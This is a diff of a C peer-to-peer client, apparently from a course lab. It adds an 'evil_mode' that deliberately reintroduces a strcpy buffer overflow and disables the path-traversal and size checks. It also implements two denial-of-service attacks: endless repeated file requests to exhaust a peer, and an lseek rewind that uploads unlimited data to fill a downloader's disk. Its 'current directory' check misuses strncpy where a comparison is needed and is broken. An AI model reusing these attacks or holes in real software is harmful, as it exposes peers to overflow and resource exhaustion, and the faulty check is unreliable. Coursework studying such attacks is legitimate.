@@ -37,6 +37,7 @@ static int listen_port;
 
 #define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
+#define FILESIZ 2147483648u // 2GiB
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -476,14 +477,16 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-
-	//strcpy(t->filename, filename);
-
-	//exercise 2
-	//fixed the buffer overrun bug
-	strncpy(t->filename, filename, FILENAMESIZ);
-	//add the null-character at the end manually.
-	t->filename[FILENAMESIZ - 1] = '\0';
+	if(evil_mode != 0)
+		strcpy(t->filename, filename);
+	else
+	{
+		//exercise 2
+		//fixed the buffer overrun bug
+		strncpy(t->filename, filename, FILENAMESIZ);
+		//add the null-character at the end manually.
+		t->filename[FILENAMESIZ - 1] = '\0';
+	}
 
 	// add peers
 	s1 = tracker_task->buf;
@@ -534,6 +537,23 @@ static void task_download(task_t *t, task_t *tracker_task)
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
+	//exercise 3
+	//keep requesting cat1.jpg from peer, so peer would keep uploading
+
+	if(evil_mode == 1)
+	{
+		while(1)
+		{
+			osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (t->peer_fd == -1) 
+			{
+				error("* Cannot connect to peer: %s\n", strerror(errno));
+				goto try_again;
+			}
+		}
+	}
+
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
 	// "foo.txt~1~".  However, if there are 50 local files, don't download
@@ -575,6 +595,17 @@ static void task_download(task_t *t, task_t *tracker_task)
 		if (ret == TBUF_ERROR) {
 			error("* Disk write error");
 			goto try_again;
+		}
+
+		//exercise 2: prevent huge files
+		if(evil_mode == 0)
+		{
+			if(t->total_written > FILESIZ)
+			{
+				error("Error: The file is too large\n");
+				error("Pick a new peer\n");
+				goto try_again;
+			}
 		}
 	}
 
@@ -657,28 +688,31 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
-	//exercise 2: make sure the name of the file requested is not too long
-	if(strlen(t->filename) > FILENAMESIZ)
+	if(evil_mode == 0)
 	{
-		error("Error: file name is too long\n");
-		goto exit;
-	}
-
-	//exercise 2: make sure the files is not outside the current directory
-	char current_dir_buf[PATH_MAX];
-	char dir_buf[PATH_MAX];
-	char * current_dir = getcwd(current_dir_buf, PATH_MAX);
-	if((getcwd(current_dir_buf, PATH_MAX)) == NULL)
-	{
-		error("Error: getcwd() error\n");
-		goto exit;
-	}
-	else 
-	{
-		if(strncpy(current_dir, realpath(t->filename, dir_buf), strlen(current_dir)) != 0)
+		//exercise 2: make sure the name of the file requested is not too long
+		if(strlen(t->filename) > FILENAMESIZ)
 		{
-			error("Error: File requested is outside the current directory\n");
+			error("Error: file name is too long\n");
 			goto exit;
+		}
+
+		//exercise 2: make sure the files is not outside the current directory
+		char current_dir_buf[PATH_MAX];
+		char dir_buf[PATH_MAX];
+		char * current_dir = getcwd(current_dir_buf, PATH_MAX);
+		if((getcwd(current_dir_buf, PATH_MAX)) == NULL)
+		{
+			error("Error: getcwd() error\n");
+			goto exit;
+		}
+		else 
+		{
+			if(strncpy(current_dir, realpath(t->filename, dir_buf), strlen(current_dir)) != 0)
+			{
+				error("Error: File requested is outside the current directory\n");
+				goto exit;
+			}
 		}
 	}
 
@@ -696,6 +730,13 @@ static void task_upload(task_t *t)
 			error("* Peer write error");
 			goto exit;
 		}
+
+		//exercise 3
+		//resetting the location pointing in the file descriptor
+		//making it uploading unlimited data to fill up
+		//the downloader's disk.
+		if(evil_mode == 1)
+			lseek(t->disk_fd, 0,0);
 
 		ret = read_to_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -792,25 +833,58 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
-	// First, download files named on command line.
-	/*
-	for (; argc > 1; argc--, argv++)
-		if ((t = start_download(tracker_task, argv[1])))
-			task_download(t, tracker_task);
-			*/
 
-	//execrise 1
-	//Parallel Uploads and Downloads
 	pid_t pid;
-	for (; argc > 1; argc--, argv++)
+	// First, download files named on command line.
+	if(evil_mode != 0)
 	{
-		if ((t = start_download(tracker_task, argv[1])))
+		for (; argc > 1; argc--, argv++)
+			if ((t = start_download(tracker_task, argv[1])))
+				task_download(t, tracker_task);
+	}
+	else
+	{
+			
+
+		//exercise 1
+		//Parallel Uploads and Downloads
+		for (; argc > 1; argc--, argv++)
+		{
+			if ((t = start_download(tracker_task, argv[1])))
+			{
+				pid = fork();
+
+				if(pid == 0)
+				{
+					task_download(t, tracker_task);
+					_exit(0);
+				}
+				else if(pid == -1)
+				{
+					error("Fork failed");
+				}
+				else
+					continue;
+			}
+		}
+	}
+
+	// Then accept connections from other peers and upload files to them!
+	if(evil_mode != 0)
+	{
+		while ((t = task_listen(listen_task)))
+			task_upload(t);
+	}
+	else
+	{
+
+		while((t = task_listen(listen_task)))
 		{
 			pid = fork();
 
 			if(pid == 0)
 			{
-				task_download(t, tracker_task);
+				task_upload(t);
 				_exit(0);
 			}
 			else if(pid == -1)
@@ -820,27 +894,6 @@ int main(int argc, char *argv[])
 			else
 				continue;
 		}
-	}
-
-	// Then accept connections from other peers and upload files to them!
-	//while ((t = task_listen(listen_task)))
-	//	task_upload(t);
-
-	while((t = task_listen(listen_task)))
-	{
-		pid = fork();
-
-		if(pid == 0)
-		{
-			task_upload(t);
-			_exit(0);
-		}
-		else if(pid == -1)
-		{
-			error("Fork failed");
-		}
-		else
-			continue;
 	}
 
 	return 0;
